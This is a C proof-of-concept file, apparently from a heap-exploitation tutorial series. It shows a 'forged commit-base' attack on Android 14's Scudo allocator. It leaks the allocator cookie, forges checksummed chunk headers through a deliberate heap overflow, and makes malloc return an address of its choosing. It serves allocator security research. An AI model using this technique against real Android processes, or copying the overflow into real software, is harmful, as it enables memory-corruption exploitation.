#define _GNU_SOURCE

#include "target.h"

#include <android/log.h>

#include <link.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * Forged commit-base demonstration for Android 14 AArch64 libc build ID
 * 1d36f8ae6e0af6158793abea7d4f4f2b.
 *
 * Inspired by the technique described in:
 * https://www.usenix.org/system/files/woot24-mao.pdf
 *
 * Starting primitives modeled by this demonstration:
 *   - disclosure of the Scudo cookie and libc base;
 *   - a heap overflow into an adjacent chunk header;
 *   - repeated controlled primary allocations of at least 0x40 bytes; and
 *   - the ability to allocate a secondary chunk.
 *
 * Result demonstrated:
 *   - a secondary malloc returning a chosen 16-byte-aligned address.
 *
 * Important runtime assumptions:
 *   - exact libc build ID and AArch64 ABI named above;
 *   - memory tagging is inactive for this process;
 *   - the derived 0x30-byte secondary-header layout is in use; and
 *   - Scudo's secondary cache accepts the forged entry.
 *
 * This source intentionally performs an out-of-bounds metadata overwrite. It
 * is a controlled allocator experiment for a disposable Android research
 * target, not memory-safe application code.
 */

enum {
    kTransferBatchSize = 13,
    kPrimaryRequestSize = 0x40,
    kPrimaryChunkStride = 0x50,
    kSecondaryRequestSize = 0x20000,
    kClassIdShift = 0,
    kStateShift = 8,
    kOriginShift = 10,
    kSizeOrUnusedBytesShift = 12,
    kOffsetShift = 32,
    kChecksumShift = 48,
};

/*
 * Derived from the target's MapAllocator<AndroidNormalConfig> machine code.
 * Its MemMapLinux object consists of Base and Capacity for this build.
 */
struct SecondaryChunkHeader {
    struct SecondaryChunkHeader *prev; /* +0x00 */
    struct SecondaryChunkHeader *next; /* +0x08 */
    uintptr_t commit_base;             /* +0x10 */
    uintptr_t commit_size;             /* +0x18 */
    uintptr_t map_base;                /* +0x20 */
    uintptr_t map_capacity;            /* +0x28 */
};

_Static_assert(sizeof(void *) == 8, "this PoC requires a 64-bit ABI");
_Static_assert(sizeof(struct SecondaryChunkHeader) ==
                   HOW2SCUDO_TARGET_SECONDARY_HEADER_SIZE,
               "unexpected Scudo secondary-header size");
_Static_assert(offsetof(struct SecondaryChunkHeader, commit_base) == 0x10,
               "unexpected CommitBase offset");
_Static_assert(offsetof(struct SecondaryChunkHeader, commit_size) == 0x18,
               "unexpected CommitSize offset");
_Static_assert(offsetof(struct SecondaryChunkHeader, map_base) == 0x20,
               "unexpected map base offset");
_Static_assert(offsetof(struct SecondaryChunkHeader, map_capacity) == 0x28,
               "unexpected map capacity offset");

static const char kLogTag[] = "HOW2SCUDO_FCB";
static uintptr_t g_libc_base;
_Alignas(16) static char g_overwrite_me[32] = "overwriteme";

__attribute__((format(printf, 3, 4))) static void
log_message(int priority, FILE *stream, const char *format, ...) {
    va_list arguments;
    va_start(arguments, format);

    va_list android_arguments;
    va_copy(android_arguments, arguments);
    __android_log_vprint(priority, kLogTag, format, android_arguments);
    va_end(android_arguments);

    fprintf(stream, "[%s] ", kLogTag);
    vfprintf(stream, format, arguments);
    fputc('\n', stream);
    fflush(stream);
    va_end(arguments);
}

#define LOGI(...) log_message(ANDROID_LOG_INFO, stdout, __VA_ARGS__)
#define LOGE(...) log_message(ANDROID_LOG_ERROR, stderr, __VA_ARGS__)

static uintptr_t untag(uintptr_t value) {
    return value & HOW2SCUDO_TARGET_ADDRESS_MASK;
}

static int find_libc(struct dl_phdr_info *info, size_t size, void *data) {
    (void)size;
    (void)data;

    if (info->dlpi_name != NULL &&
        strstr(info->dlpi_name, "/libc.so") != NULL) {
        g_libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

static bool locate_libc(void) {
    g_libc_base = 0;
    dl_iterate_phdr(find_libc, NULL);
    return g_libc_base != 0;
}

static uint32_t leak_scudo_cookie(void) {
    uintptr_t address = g_libc_base + HOW2SCUDO_TARGET_SCUDO_ALLOCATOR_OFFSET;
    return *(volatile uint32_t *)address;
}

/* Software CRC32C equivalent of the target's AArch64 crc32cx sequence. */
static uint32_t crc32_u64(uint32_t crc, uint64_t value) {
    crc ^= (uint32_t)value;
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }

    crc ^= (uint32_t)(value >> 32);
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }
    return crc;
}

static uint16_t scudo_header_checksum(uintptr_t user_pointer,
                                      uint64_t packed_header, uint32_t cookie) {
    uint32_t crc = crc32_u64(cookie, user_pointer);
    crc = crc32_u64(crc, packed_header & UINT64_C(0x0000ffffffffffff));
    return (uint16_t)(crc ^ (crc >> 16));
}

/*
 * Bionic's free() wrapper removes its process heap tag before entering
 * scudo_free(). With MTE inactive, this target's getHeaderTaggedPointer()
 * therefore computes the checksum using the untagged address plus fixed tag 2.
 */
static uintptr_t header_pointer_for_checksum(const void *pointer) {
    return untag((uintptr_t)pointer) | HOW2SCUDO_TARGET_SCUDO_HEADER_TAG;
}

static uint64_t build_allocated_header(unsigned class_id, uint16_t checksum) {
    uint64_t header = 0;
    header |= (uint64_t)class_id << kClassIdShift;
    header |= UINT64_C(1) << kStateShift;
    header |= UINT64_C(0) << kOriginShift;
    header |= UINT64_C(0) << kSizeOrUnusedBytesShift;
    header |= UINT64_C(0) << kOffsetShift;
    header |= (uint64_t)checksum << kChecksumShift;
    return header;
}

static void print_pointer(const char *label, const void *pointer) {
    LOGI("%s%p", label, pointer);
}

int how2scudo_run(void) {
    LOGI("=== forged commit-base tutorial ===");
    LOGI("Goal: turn a heap overflow plus a Scudo cookie leak into a "
         "controlled secondary allocation.");
    LOGI("Starting primitives: libc-base/cookie disclosure, an overflow into "
         "an adjacent header, repeated 0x40 allocations, and a secondary "
         "allocation.");
    LOGI("Success condition: malloc(0x%x) returns the selected aligned address "
         "and a marker can be written through that pointer.",
         kSecondaryRequestSize);
    LOGI("Target guard: Android API %u, ABI %s, exact libc build ID %s.",
         HOW2SCUDO_TARGET_ANDROID_API, HOW2SCUDO_TARGET_ABI,
         HOW2SCUDO_TARGET_LIBC_BUILD_ID);
    LOGI("The executable cannot prove the runtime build ID itself; verify it "
         "before running this build-specific demonstration.");

    LOGI("[1/7] Locate libc and obtain the Scudo header-cookie primitive.");
    LOGI("Scudo protects each packed chunk header with a checksum derived from "
         "the header address, metadata, and a per-process cookie.");

    if (!locate_libc()) {
        LOGE("[1/7] Failed: could not locate libc.so in the process mappings.");
        return 1;
    }

    uint32_t cookie = leak_scudo_cookie();
    LOGI("[1/7] libc base: 0x%zx", (size_t)g_libc_base);
    LOGI("[1/7] cookie at libc + 0x%zx: 0x%08x",
         (size_t)HOW2SCUDO_TARGET_SCUDO_ALLOCATOR_OFFSET, cookie);

    LOGI("[2/7] Exercise the secondary allocator and keep one real secondary "
         "allocation alive.");
    LOGI("This preserves the setup used by the forged commit-base technique "
         "while the later corrupted chunk is inserted into the secondary "
         "cache.");

    void *secondary_guard = malloc(kSecondaryRequestSize);
    if (secondary_guard == NULL) {
        LOGE("[2/7] Failed: initial secondary allocation returned null.");
        return 2;
    }
    print_pointer("[2/7] live secondary allocation: ", secondary_guard);

    LOGI("[3/7] Search for two adjacent primary chunks.");
    LOGI("On this target, a 0x%x request has a 0x%x chunk stride. The "
         "0x10-byte gap is Scudo's combined-header area.",
         kPrimaryRequestSize, kPrimaryChunkStride);
    LOGI("We allocate %u entries, matching the relevant transfer-batch size. "
         "Randomized allocation can still require another process run.",
         kTransferBatchSize);

    char *chunks[kTransferBatchSize] = {0};
    for (size_t index = 0; index < kTransferBatchSize; ++index) {
        chunks[index] = (char *)malloc(kPrimaryRequestSize);
        if (chunks[index] == NULL) {
            LOGE("[3/7] Failed: primary allocation %zu returned null.", index);
            return 3;
        }
        LOGI("[3/7] primary[%zu]: %p", index, (void *)chunks[index]);
    }

    char *low = NULL;
    char *high = NULL;
    for (size_t first = 0; first < kTransferBatchSize && low == NULL; ++first) {
        uintptr_t a = untag((uintptr_t)chunks[first]);
        for (size_t second = first + 1; second < kTransferBatchSize; ++second) {
            uintptr_t b = untag((uintptr_t)chunks[second]);
            if (a + kPrimaryChunkStride == b) {
                low = chunks[first];
                high = chunks[second];
                break;
            }
            if (b + kPrimaryChunkStride == a) {
                low = chunks[second];
                high = chunks[first];
                break;
            }
        }
    }

    if (low == NULL) {
        LOGE("[3/7] Retry condition: no adjacent pair was found. This is heap "
             "randomization, not allocator rejection of the forged metadata.");
        return 4;
    }

    print_pointer("[3/7] adjacent low chunk:  ", low);
    print_pointer("[3/7] adjacent high chunk: ", high);

    LOGI("[4/7] Place a fake secondary header before the high chunk.");
    LOGI("This libc has a 0x%x-byte secondary header followed by a 0x%x-byte "
         "combined-header area, so the secondary header starts 0x%x bytes "
         "before its user pointer.",
         HOW2SCUDO_TARGET_SECONDARY_HEADER_SIZE,
         HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE,
         HOW2SCUDO_TARGET_SECONDARY_USER_DELTA);

    /*
     * The fake secondary header begins high - 0x40. For 0x50-spaced primary
     * chunks that is low + 0x10, entirely inside the low user allocation.
     */
    uintptr_t forged_header_address =
        untag((uintptr_t)high) - HOW2SCUDO_TARGET_SECONDARY_USER_DELTA;
    uintptr_t expected_header_address = untag((uintptr_t)low) + 0x10U;
    if (forged_header_address != expected_header_address) {
        LOGE("[4/7] Failed: the adjacent chunks do not produce the derived "
             "secondary-header placement.");
        return 5;
    }

    uintptr_t target_address = untag((uintptr_t)&g_overwrite_me[0]);
    struct SecondaryChunkHeader forged_secondary = {0};
    forged_secondary.commit_base =
        target_address - HOW2SCUDO_TARGET_SECONDARY_USER_DELTA;
    forged_secondary.commit_size =
        kSecondaryRequestSize + HOW2SCUDO_TARGET_SECONDARY_USER_DELTA;
    memcpy((void *)forged_header_address, &forged_secondary,
           sizeof(forged_secondary));
    LOGI("[4/7] fake header address: 0x%zx", (size_t)forged_header_address);
    LOGI("[4/7] chosen returned address: 0x%zx", (size_t)target_address);
    LOGI("[4/7] forged CommitBase: 0x%zx; forged CommitSize: 0x%zx",
         (size_t)forged_secondary.commit_base,
         (size_t)forged_secondary.commit_size);
    LOGI("CommitBase is target - 0x%x. When this cached entry is reused, "
         "Scudo advances past its headers and should return the target itself.",
         HOW2SCUDO_TARGET_SECONDARY_USER_DELTA);

    LOGI("[5/7] Forge the high chunk's checksummed combined header.");
    LOGI("ClassId 0 makes Scudo treat the chunk as secondary; State=Allocated "
         "passes the free-state check. A correct checksum is still required.");
    uint64_t packed_without_checksum = build_allocated_header(0, 0);
    uintptr_t checksum_pointer = header_pointer_for_checksum(high);
    uint16_t checksum = scudo_header_checksum(checksum_pointer,
                                              packed_without_checksum, cookie);
    uint64_t forged_combined = build_allocated_header(0, checksum);
    LOGI("[5/7] checksum input pointer: 0x%zx; forged checksum: 0x%04x",
         (size_t)checksum_pointer, (unsigned)checksum);
    LOGI("Bionic removes its process heap tag before scudo_free; with MTE "
         "inactive, this target checksums the untagged address with Scudo tag "
         "2.");

    /*
     * Deliberate heap overflow: low has 0x40 user bytes, so low + 0x40 is the
     * adjacent high chunk's combined-header area.
     */
    uintptr_t combined_header_address =
        untag((uintptr_t)low) + kPrimaryRequestSize;
    memcpy((void *)combined_header_address, &forged_combined,
           sizeof(forged_combined));
    LOGI("[5/7] The modeled heap overflow copied the forged packed header to "
         "low + 0x%x, which is the adjacent high chunk's header.",
         kPrimaryRequestSize);

    LOGI("[6/7] Free the corrupted high chunk.");
    LOGI("If the checksum and fields pass validation, Scudo follows ClassId 0 "
         "and inserts the fake secondary entry into its cache.");
    free(high);
    LOGI("[6/7] free() returned without a Scudo abort; request an equal-sized "
         "secondary allocation to retrieve the cached entry.");

    LOGI("[7/7] Call malloc(0x%x) and compare its result with the chosen "
         "address.",
         kSecondaryRequestSize);
    void *victim = malloc(kSecondaryRequestSize);
    if (victim == NULL) {
        LOGE("[7/7] Failed: final secondary allocation returned null.");
        return 6;
    }

    print_pointer("[7/7] returned allocation: ", victim);
    print_pointer("[7/7] chosen target:       ", &g_overwrite_me[0]);
    if (untag((uintptr_t)victim) != target_address) {
        LOGE("[7/7] Failed: malloc returned a different address, so this run "
             "did not demonstrate a controlled allocation.");
        return 7;
    }

    static const char kMarker[] = "controlled";
    memcpy(victim, kMarker, sizeof(kMarker));
    LOGI("[7/7] SUCCESS: target now contains '%s'.", g_overwrite_me);
    LOGI("Demonstrated primitive: a secondary malloc returned a chosen aligned "
         "address. This is stronger than a crash, but does not by itself prove "
         "code execution.");

    /*
     * Do not free victim: it aliases static storage rather than a real mapping.
     * The intentionally leaked allocations keep corrupted demonstration state
     * from being processed during cleanup.
     */
    return 0;
}

#ifdef HOW2SCUDO_STANDALONE
int main(void) { return how2scudo_run(); }
#endif
